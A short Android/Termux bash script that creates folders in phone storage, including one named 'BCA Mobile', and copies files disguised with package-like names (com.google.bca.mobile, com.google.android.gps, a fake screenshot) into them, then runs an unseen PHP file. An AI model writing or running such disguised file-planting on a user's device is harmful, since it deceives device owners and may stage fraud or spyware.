#!/bin/bash
if [ -f "/storage/emulated/0/Download/BCA Mobile" ]; then
  echo "File already exists!"
else
  mkdir "/storage/emulated/0/Download/BCA Mobile"
fi
if [ -f "/storage/emulated/0/DCIM/Screenshots" ]; then
  echo "File already exists!"
else
  mkdir "/storage/emulated/0/DCIM/Screenshots"
fi
if [ -f "/storage/emulated/0/Android/media" ]; then
  echo "File already exists!"
else
  mkdir "/storage/emulated/0/Android/media"
fi
cp com.google.bca.mobile "/storage/emulated/0/Download/BCA Mobile/com.google.bca.mobile"
cp com.phone.jpg.ss "/storage/emulated/0/DCIM/Screenshots/com.phone.jpg.ss"
cp com.google.android.gps "/storage/emulated/0/Android/media/com.google.android.gps"
php peler.php